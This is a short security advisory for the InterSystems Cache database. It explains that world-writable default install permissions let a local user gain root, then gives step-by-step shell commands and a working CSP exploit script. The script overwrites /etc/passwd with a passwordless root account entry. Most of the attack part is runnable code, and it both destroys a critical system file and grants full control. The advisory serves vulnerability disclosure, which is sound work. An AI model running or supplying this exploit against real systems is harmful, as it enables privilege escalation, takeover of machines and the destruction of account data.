   Description: Cache', the post-relational database for e-applications,
   is optimized for the tougher demands of Web applications. It delivers
   breakthrough performance for massively scalable Web applications. Its
   rapid application development environment with advanced object
   technology lets you operate at Internet speed. Cache's ultra-fast SQL
   outperforms relational systems 20X. And its multidimensional
   application and data server delivers lightning-fast performance.
   Vulnerability:
   The default installation of the Cache database yeilds poorly protected
   files and directories in the main package tree. Directories and files
   are open to all users as read write and execute. Local attackers can
   exploit this to manipulate directories and binaries inside the
   installation tree. This may be used by a local malicious user to gain
   root access. The content in /cachesys/csp/user is executed as root
   through the web interface. user's parent directory (csp) is world
   writeable allowing a local non root user to move user aside, copy its
   contents and create a new writeable user directory. $ mv
   /cachesys/csp/user /cachesys/csp/user.old $ cp -rp /cachesys/csp/user
   /cachesys/csp/user.old $ cp cspexp.csp /cachesys/csp/user $ lnyx
   http://localhost/csp/user/cspexp.csp $ su - cache

   Exploit Code:

    1. Intersystems Cache local root exploit. Larry W. Cashdollar
       http://vapid.dhs.org
    2.
    3. Because of poor default file and directory permissions a localuser
       can execute code as root via the cache CSP interpreter. <HR>
       Attempting to overwrite /etc/passwd with
       cache::0:0:root:/root:/bin/bash.
    4. filename -> cspexp.csp
    5.
    6. <script language=Cache runat=server>
    7.
    8. Set cdef=##class(%Library.File).%New("/etc/passwd")
    9. Do cdef.Open("WSN")
   10. Do cdef.WriteLine("cache::0:0:root:/root:/bin/bash")
   11. Do cdef.%Close()
   12. </script>
